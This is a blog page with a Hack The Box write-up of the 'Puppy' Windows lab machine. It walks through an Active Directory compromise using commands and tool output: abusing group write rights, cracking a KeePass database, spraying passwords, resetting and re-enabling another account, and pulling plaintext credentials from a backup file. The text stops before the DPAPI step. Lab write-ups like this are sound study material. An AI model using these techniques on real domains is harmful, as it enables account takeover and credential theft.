<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Puppy (Windows Medium) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content=" This Windows Medium box starts with our user having write permissions over the DEVELOPERS group. Once we look at shares we find available to use..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Puppy (Windows Medium)",
  "url": "https://d34db33fb04h.github.io/2025/05/17/Puppy/",
  "image": "https://d34db33fb04h.github.io/img/puppy.png",
  "datePublished": "2025-05-17T22:04:23.000Z",
  "dateModified": "2025-08-21T02:17:06.360Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/05/17/Puppy/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Puppy (Windows Medium)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/hacksmarter/"><i class="fa-fw fa-solid fa-computer"></i><span> HackSmarter</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Puppy (Windows Medium)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/hacksmarter/"><i class="fa-fw fa-solid fa-computer"></i><span> HackSmarter</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Puppy (Windows Medium)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-05-17T22:04:23.000Z" title="Created 2025-05-17 17:04:23">2025-05-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-21T02:17:06.360Z" title="Updated 2025-08-20 21:17:06">2025-08-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/img/puppy.png"></p>
<p>This Windows Medium box starts with our user having write permissions over the DEVELOPERS group. Once we look at shares we find available to use the DEV share. In this share lies a keepass database, which we exfiltrate to our machine. Once done we crack the password to the database and discover users and credentials. After password spraying we have another valid user, and this user is in the SENIOR DEVS group, with GenericAll to user Adam.Silver. After re-enabling his account, we can finally get on the box. Going to the root directory we find a Backups directory with a zip file containing an xml file with credentials for Steph.Cooper. Using these credentials we login, and if we looked at bloodhound or other users we noticed a steph.cooper_adm. With access to this users AppData we exfiltrate the file required for DPAPI. Once we dump DPAPI, we find credentials for steph.cooper_adm.</p>
<p><em>Starts as an assumed breach with credentials: levi.james &#x2F; KingofAkron2025!</em></p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-19 23:17:01Z)</span><br><span class="line">111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/tcp6  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp6  rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)</span><br><span class="line">3260/tcp open  iscsi?        syn-ack ttl 127</span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2025-08-19T23:18:50</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: -55m40s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| p2p-conficker:</span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 62785/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 31083/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 26380/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 63353/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br></pre></td></tr></table></figure>

<h2 id="What-are-we-doing-as-the-KING"><a href="#What-are-we-doing-as-the-KING" class="headerlink" title="What are we doing as the KING"></a>What are we doing as the KING</h2><p>At first, I wanted to check and see what we have writable.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">konoha# bloodyAD -v DEBUG -d puppy.htb -u levi.james -p &#x27;KingofAkron2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb get writable</span><br><span class="line">[+] Connection URL: ldap+ntlm-pw://puppy.htb\levi.james:KingofAkron2025%21@puppy.htb/?serverip=10.10.11.70</span><br><span class="line">[*] Trying to connect to puppy.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=PUPPY,DC=HTB</span><br><span class="line">permission: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB</span><br><span class="line">permission: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=DEVELOPERS,DC=PUPPY,DC=HTB</span><br><span class="line">permission: WRITE</span><br></pre></td></tr></table></figure>

<p>This shows us we can add ourselves to this group since we have write.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">konoha# bloodyAD -v DEBUG -d puppy.htb -u levi.james -p &#x27;KingofAkron2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb add groupMember &#x27;Developers&#x27; &#x27;levi.james&#x27;</span><br><span class="line">[+] Connection URL: ldap+ntlm-pw://puppy.htb\levi.james:KingofAkron2025%21@puppy.htb/?serverip=10.10.11.70</span><br><span class="line">[*] Trying to connect to puppy.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[+] levi.james added to Developers</span><br></pre></td></tr></table></figure>

<h2 id="Getting-to-know-one-another-ðŸ˜‘"><a href="#Getting-to-know-one-another-ðŸ˜‘" class="headerlink" title="Getting to know one another ðŸ˜‘"></a>Getting to know one another ðŸ˜‘</h2><p>So I went ahead and got a bloodhound dump for later use when weâ€™re futher.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">konoha# rusthound -z -u levi.james@puppy.htb -p &#x27;KingofAkron2025!&#x27; -f DC.puppy.htb -d puppy.htb -i 10.10.11.70</span><br></pre></td></tr></table></figure>
<h2 id="What-were-you-hiding"><a href="#What-were-you-hiding" class="headerlink" title="What were you hiding??"></a>What were you hiding??</h2><p>Before we didnâ€™t have read access over the DEV share. Now we can see what lingers in this share.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">konoha# impacket-smbclient &#x27;puppy.htb/levi.james:KingofAkron2025!@puppy.htb&#x27;</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Type help for list of commands</span><br><span class="line"># use DEV</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Sun Mar 23 02:07:57 2025 .</span><br><span class="line">drw-rw-rw-          0  Sat Mar  8 10:52:57 2025 ..</span><br><span class="line">-rw-rw-rw-   34394112  Sun Mar 23 02:09:12 2025 KeePassXC-2.7.9-Win64.msi</span><br><span class="line">drw-rw-rw-          0  Sun Mar  9 15:16:16 2025 Projects</span><br><span class="line">-rw-rw-rw-       2677  Tue Mar 11 21:25:46 2025 recovery.kdbx</span><br><span class="line"># mget recovery.kdbx</span><br><span class="line">[*] Downloading recovery.kdbx</span><br></pre></td></tr></table></figure>
<p>A keepass database, we can crack this hash using <em>keepass2john</em>, or I just used <em>keepass4brute.sh</em>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">konoha# ./keepass4brute.sh ~/Documents/htb/machines/TMP/recovery.kdbx /usr/share/wordlists/rockyou.txt</span><br><span class="line">keepass4brute 1.3 by r3nt0n</span><br><span class="line">https://github.com/r3nt0n/keepass4brute</span><br><span class="line"></span><br><span class="line">[+] Words tested: 36/14344393 - Attempts per minute: 86 - Estimated time remaining: 16 weeks, 3 days</span><br><span class="line">[+] Current attempt: liverpool</span><br><span class="line"></span><br><span class="line">[*] Password found: liverpool</span><br></pre></td></tr></table></figure>

<h2 id="Show-me-your-moves"><a href="#Show-me-your-moves" class="headerlink" title="Show me your moves!!"></a>Show me your moves!!</h2><p>Once in the database we have some users and some passwords we can sort through.<br><img src="/img/puppy1.png"></p>
<p>We can go and password spray, once we do we get a hit.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">konoha# nxc smb puppy.htb -u users.lst -p passwd.lst --continue-on-success</span><br><span class="line">SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!</span><br><span class="line">SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>Lets see what he has in bloodhound.<br><img src="/img/puppy2.png"></p>
<p>So <em>GenericAll</em>, we can simply just change his password and get on the box.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">konoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p &#x27;Antman2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb set password adam.silver &#x27;SuperSecurePassword123!&#x27;</span><br><span class="line">[+] Connection URL: ldap+ntlm-pw://puppy.htb\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70</span><br><span class="line">[*] Trying to connect to puppy.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure>
<p>We can try to evil-winrm with his account but when we donâ€™t get connected, looking more at his account explains.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">konoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p &#x27;Antman2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb get object adam.silver</span><br><span class="line">[+] Connection URL: ldap+ntlm-pw://puppy.htb\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70</span><br><span class="line">[*] Trying to connect to puppy.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB</span><br><span class="line">accountExpires: 9999-12-31 23:59:59.999999+00:00</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">sAMAccountName: adam.silver</span><br><span class="line">sAMAccountType: 805306368</span><br><span class="line">sn: Silver</span><br><span class="line">uSNChanged: 176441</span><br><span class="line">uSNCreated: 12814</span><br><span class="line">userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD</span><br></pre></td></tr></table></figure>

<p>We can see its disabled, so we can simply remove the <em>ACCOUNTDISABLE</em> flag and try again.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">konoha# bloodyAD -v DEBUG -d puppy.htb -u ant.edwards -p &#x27;Antman2025!&#x27; --dc-ip 10.10.11.70 --host puppy.htb remove uac adam.silver -f ACCOUNTDISABLE</span><br><span class="line">[+] Connection URL: ldap+ntlm-pw://puppy.htb\ant.edwards:Antman2025%21@puppy.htb/?serverip=10.10.11.70</span><br><span class="line">[*] Trying to connect to puppy.htb...</span><br><span class="line">[+] Connection successful</span><br><span class="line">[-] [&#x27;ACCOUNTDISABLE&#x27;] property flags removed from adam.silver&#x27;s userAccountControl</span><br></pre></td></tr></table></figure>
<p><img src="/img/great.gif"></p>
<h2 id="Silver-Surfing"><a href="#Silver-Surfing" class="headerlink" title="Silver Surfing"></a>Silver Surfing</h2><p>Once connected, we look at the root directory.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; ls -fo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d--hs-         2/28/2025  12:31 PM                $Recycle.Bin</span><br><span class="line">d--h--         5/12/2025   5:29 PM                $WinREAgent</span><br><span class="line">d-----          5/9/2025  10:48 AM                Backups</span><br><span class="line">d--hsl         2/19/2025  11:32 AM                Documents and Settings</span><br><span class="line">d-----         5/12/2025   5:21 PM                inetpub</span><br><span class="line">d-----          5/8/2021   1:20 AM                PerfLogs</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>We see a backups directory, and when checking that out we find a <em>site-backup-2024-12-30.zip</em>. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Backups&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Backups</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip</span><br></pre></td></tr></table></figure>

<p>Once we download this and look at it, only one file looks interesting.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Backups&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Backups</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Backups&gt; download site-backup-2024-12-30.zip</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>

<h3 id="Backup-Files-suck-dude"><a href="#Backup-Files-suck-dude" class="headerlink" title="Backup Files suck dude!!!"></a>Backup Files suck dude!!!</h3><p>Here we download the file and check it out, revealing credentials.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">konoha# unzip site-backup-2024-12-30.zip puppy/nms-auth-config.xml.bak</span><br></pre></td></tr></table></figure>
<p>From the backup xml file we have found the key.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">konoha# cat nms-auth-config.xml.bak</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;ldap-config&gt;</span><br><span class="line">    &lt;server&gt;</span><br><span class="line">        &lt;host&gt;DC.PUPPY.HTB&lt;/host&gt;</span><br><span class="line">        &lt;port&gt;389&lt;/port&gt;</span><br><span class="line">        &lt;base-dn&gt;dc=PUPPY,dc=HTB&lt;/base-dn&gt;</span><br><span class="line">        &lt;bind-dn&gt;cn=steph.cooper,dc=puppy,dc=htb&lt;/bind-dn&gt;</span><br><span class="line">        &lt;bind-password&gt;ChefSteph2025!&lt;/bind-password&gt;</span><br><span class="line">    &lt;/server&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Lets-get-intersteller-coop"><a href="#Lets-get-intersteller-coop" class="headerlink" title="Lets get intersteller coop!!"></a>Lets get intersteller coop!!</h2><p>We can login and take a look around, but thereâ€™s nothing we havenâ€™t already seen. So the only thing to do is check <em>DPAPI</em>.</p>
